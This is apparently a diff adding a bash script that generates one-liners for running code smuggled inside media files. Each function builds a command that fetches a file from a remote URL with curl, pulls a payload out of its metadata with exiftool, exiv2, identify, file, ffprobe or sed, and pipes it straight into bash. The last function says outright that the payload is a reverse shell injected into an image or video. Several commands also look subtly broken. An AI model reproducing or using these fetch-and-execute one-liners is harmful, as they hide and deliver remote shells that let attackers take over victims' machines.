@@ -1,0 +1,50 @@
+#!/bin/bash
+
+method1() {
+    echo -e "\e[37mGenerating one-liner method with exiftool..."
+    one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
+
+method2() {
+    echo -e "\e[37mGenerating one-liner method with exiv2..."
+    one_liner="curl -s '$url/$filename' -o temp.jpg | exiv2 -p c temp.jpg | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
+
+method3() {
+    echo -e "\e[37mGenerating one-liner method with identify..."
+    one_liner="curl -s '$url/$filename' | identify -format '%c' - | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
+
+method4() {
+    echo -e "\e[37mGenerating one-liner method with file and grep..."
+    one_liner="curl -s '$url/$filename' | file - | grep -oP 'comment: "\K[^"]*' | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
+
+method5() {
+    echo -e "\e[37mGenerating one-liner method with exiftool..."
+    one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
+
+method6() {
+    echo -e "\e[37mGenerating one-liner method with ffprobe..."
+    one_liner="curl -s '$url/$filename' -o temp.mp4 | ffprobe temp.mp4 -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
+
+method7() {
+    echo -e "\e[37mGenerating one-liner method with sed for text based files..."
+    one_liner="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
+
+method8() {
+    echo -e "\e[37mGenerating one-liner method with exiftool for extracting the reverse shell injected on the image/video file..."
+    read -p "Enter the name of the file inside the ZIP archive: " filename2
+    one_liner="curl -s '$url/$filename' | exiftool $filename / $filename2 -Comment -b -echo | bash"
+    echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+}
